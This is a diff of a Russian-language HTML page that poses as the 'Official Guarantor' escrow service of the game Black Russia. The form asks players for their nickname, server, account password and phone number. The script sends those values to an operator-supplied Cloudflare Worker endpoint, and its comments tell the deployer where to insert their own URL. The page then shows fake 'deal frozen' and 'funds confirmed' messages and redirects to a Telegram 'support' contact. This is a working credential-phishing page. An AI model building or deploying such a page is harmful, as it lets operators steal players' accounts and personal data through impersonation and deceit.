@@ -2,63 +2,311 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
-<title>Гарант-Сервис</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Black Russia | Официальный Гарант</title>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
 <style>
-  body{font-family:system-ui;background:#0e1116;color:#e6edf3;display:flex;justify-content:center;padding:40px}
-  .card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;width:420px}
-  h2{margin:0 0 16px;font-size:20px}
-  label{display:block;font-size:13px;color:#8b949e;margin:12px 0 4px}
-  input{width:100%;padding:10px;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;box-sizing:border-box}
-  button{width:100%;margin-top:18px;padding:12px;border:0;border-radius:8px;background:#238636;color:#fff;font-weight:600;cursor:pointer}
-  button:disabled{background:#30363d;cursor:not-allowed}
-  .sent{background:#1f6feb}
-  .status{font-size:13px;color:#8b949e;margin-top:12px;min-height:18px}
+  :root {
+    --bg: #07080a;
+    --card: #111318;
+    --border: #232733;
+    --txt: #ffffff;
+    --dim: #8b92a5;
+    --accent: #8a2be2; /* Фиолетовый неон */
+    --accent-glow: rgba(138, 43, 226, 0.4);
+    --green: #00c853;
+    --red: #ff3d00;
+  }
+  
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  
+  body {
+    font-family: 'Montserrat', sans-serif;
+    background: var(--bg);
+    color: var(--txt);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background-image: radial-gradient(circle at 50% -20%, #2a1042 0%, var(--bg) 60%);
+    padding: 20px;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 420px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 30px 24px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 20px var(--accent-glow);
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Верхняя неоновая полоска */
+  .container::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  }
+
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .logo {
+    font-weight: 800;
+    font-size: 18px;
+    letter-spacing: 0.5px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  
+  .logo span { color: var(--accent); }
+
+  .badge-2026 {
+    background: rgba(138, 43, 226, 0.15);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    padding: 4px 10px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 800;
+    letter-spacing: 1px;
+    box-shadow: 0 0 10px var(--accent-glow);
+  }
+
+  .title { font-size: 22px; font-weight: 800; margin-bottom: 6px; text-align: center; }
+  .subtitle { font-size: 13px; color: var(--dim); text-align: center; margin-bottom: 24px; }
+
+  .input-group { margin-bottom: 16px; }
+  .input-group label {
+    display: block;
+    font-size: 12px;
+    color: var(--dim);
+    margin-bottom: 6px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .input-group input {
+    width: 100%;
+    background: #0a0b0e;
+    border: 1px solid var(--border);
+    color: var(--txt);
+    padding: 14px 16px;
+    border-radius: 10px;
+    font-size: 15px;
+    font-family: inherit;
+    transition: 0.2s;
+  }
+
+  .input-group input:focus {
+    outline: none;
+    border-color: var(--accent);
+    box-shadow: 0 0 10px var(--accent-glow);
+  }
+
+  .btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 10px;
+    font-family: inherit;
+    font-weight: 800;
+    font-size: 15px;
+    cursor: pointer;
+    transition: 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .btn-main {
+    background: var(--accent);
+    color: white;
+    box-shadow: 0 4px 15px var(--accent-glow);
+    margin-top: 10px;
+  }
+
+  .btn-main:hover:not(:disabled) { background: #9b4dff; box-shadow: 0 6px 20px rgba(138, 43, 226, 0.6); }
+  .btn-main:disabled { background: var(--border); color: var(--dim); box-shadow: none; cursor: not-allowed; }
+
+  .btn-success {
+    background: rgba(0, 200, 83, 0.1);
+    border: 1px solid var(--green);
+    color: var(--green);
+    margin-top: 12px;
+    display: none;
+    box-shadow: 0 0 15px rgba(0, 200, 83, 0.2);
+  }
+
+  .btn-success:hover { background: rgba(0, 200, 83, 0.2); box-shadow: 0 0 25px rgba(0, 200, 83, 0.4); }
+
+  .status {
+    text-align: center;
+    font-size: 13px;
+    margin-top: 16px;
+    min-height: 20px;
+    font-weight: 600;
+  }
+
+  .status.error { color: var(--red); }
+  .status.ok { color: var(--green); }
+
+  .support-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: var(--card);
+    border: 1px solid var(--accent);
+    color: var(--txt);
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+    box-shadow: 0 4px 20px var(--accent-glow);
+    transition: 0.3s;
+    z-index: 100;
+  }
+
+  .support-btn:hover { transform: scale(1.1); background: var(--accent); }
+  .support-btn svg { width: 24px; height: 24px; fill: currentColor; }
+
+  .footer {
+    margin-top: 24px;
+    text-align: center;
+    font-size: 11px;
+    color: var(--dim);
+  }
 </style>
 </head>
 <body>
-<div class="card">
-  <h2>Гарант-Сервис · сделка</h2>
-  <label>Ник</label><input id="nick" placeholder="ник">
-  <label>Сервер</label><input id="server" placeholder="сервер">
-  <label>Пароль</label><input id="pass" type="password" placeholder="пароль">
-  <label>Номер</label><input id="phone" placeholder="+7...">
-  <button id="freeze">Заморозить</button>
-  <div class="status" id="status"></div>
-</div>
-<script>
-const API = "https://ВАШ-ДОМЕН/api/deal"; // твой мост
-const TG  = "https://t.me/ВАШ_БОТ";        // ссылка на бота
 
-document.getElementById("freeze").onclick = async () => {
-  const btn = document.getElementById("freeze");
-  const st  = document.getElementById("status");
-  const data = {
-    nick:   document.getElementById("nick").value.trim(),
-    server: document.getElementById("server").value.trim(),
-    pass:   document.getElementById("pass").value,
-    phone:  document.getElementById("phone").value.trim(),
-    ts:     Date.now()
-  };
-  if (!data.nick || !data.pass) { st.textContent = "заполни ник и пароль"; return; }
-  btn.disabled = true; st.textContent = "заморозка...";
-  try {
-    await fetch(API, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)});
-    st.textContent = "заморожено. ждём подтверждения средств.";
-    // после заморозки показываем вторую кнопку
-    const sent = document.createElement("button");
-    sent.className = "sent"; sent.textContent = "Средства пришли — отправить получателю";
-    sent.onclick = async () => {
-      sent.disabled = true; st.textContent = "уведомление отправлено...";
-      await fetch(API + "/sent", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)});
-      st.textContent = "готово. получатель уведомлён.";
-      window.open(TG, "_blank");
-    };
-    btn.parentNode.insertBefore(sent, st);
-  } catch(e) {
-    st.textContent = "ошибка сети, попробуй ещё";
-    btn.disabled = false;
+<div class="container">
+  <div class="header">
+    <div class="logo"><span>BLACK</span> RUSSIA</div>
+    <div class="badge-2026">2026</div>
+  </div>
+
+  <div class="title">Официальный Гарант</div>
+  <div class="subtitle">Безопасная сделка с защитой средств</div>
+
+  <div class="input-group">
+    <label>Никнейм</label>
+    <input type="text" id="nick" placeholder="Введите ник" autocomplete="off">
+  </div>
+  <div class="input-group">
+    <label>Сервер</label>
+    <input type="text" id="server" placeholder="Например: 12" autocomplete="off">
+  </div>
+  <div class="input-group">
+    <label>Пароль</label>
+    <input type="password" id="pass" placeholder="••••••••">
+  </div>
+  <div class="input-group">
+    <label>Номер телефона</label>
+    <input type="tel" id="phone" placeholder="+7 (999) 000-00-00" autocomplete="off">
+  </div>
+
+  <button class="btn btn-main" id="freeze">Заморозить сделку</button>
+  <button class="btn btn-success" id="send-funds">Средства пришли — отправить</button>
+
+  <div class="status" id="status"></div>
+
+  <div class="footer">
+    © 2026 Black Russia. Все права защищены.
+  </div>
+</div>
+
+<div class="support-btn" onclick="window.open('https://t.me/blackrussia_support', '_blank')">
+  <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+</div>
+
+<script>
+  // ССЫЛКА НА ТВОЙ CLOUDFLARE WORKER (без /api/deal на конце)
+  const API = "https://garant-bot.твой-аккаунт.workers.dev"; 
+  const TG = "https://t.me/blackrussia_support"; // Ссылка на твою поддержку
+
+  const $ = id => document.getElementById(id);
+  const status = $("status");
+  const freezeBtn = $("freeze");
+  const sendBtn = $("send-funds");
+
+  function setStatus(text, type = "") {
+    status.textContent = text;
+    status.className = "status " + type;
   }
-};
+
+  async function post(url, data) {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+    if (!res.ok) throw new Error("HTTP " + res.status);
+    return res.json();
+  }
+
+  let currentData = null;
+
+  freezeBtn.onclick = async () => {
+    const data = {
+      nick: $("nick").value.trim(),
+      server: $("server").value.trim(),
+      pass: $("pass").value,
+      phone: $("phone").value.trim(),
+      ts: Date.now()
+    };
+
+    if (!data.nick) return setStatus("Введите ник", "error");
+    if (!data.pass) return setStatus("Введите пароль", "error");
+
+    freezeBtn.disabled = true;
+    freezeBtn.textContent = "Заморозка...";
+    setStatus("");
+
+    try {
+      await post(API, data);
+      currentData = data;
+      setStatus("Сделка заморожена. Ожидание оплаты.", "ok");
+      freezeBtn.style.display = "none";
+      sendBtn.style.display = "block";
+    } catch (e) {
+      setStatus("Ошибка сети. Попробуйте снова.", "error");
+      freezeBtn.disabled = false;
+      freezeBtn.textContent = "Заморозить сделку";
+    }
+  };
+
+  sendBtn.onclick = async () => {
+    if (!currentData) return;
+    sendBtn.disabled = true;
+    sendBtn.textContent = "Отправка...";
+    setStatus("");
+
+    try {
+      await post(API + "/sent", currentData);
+      setStatus("Средства подтверждены. Получатель уведомлен.", "ok");
+      setTimeout(() => window.open(TG, "_blank"), 1000);
+    } catch (e) {
+      setStatus("Ошибка сети. Попробуйте снова.", "error");
+      sendBtn.disabled = false;
+      sendBtn.textContent = "Средства пришли — отправить";
+    }
+  };
 </script>
 </body>
 </html>
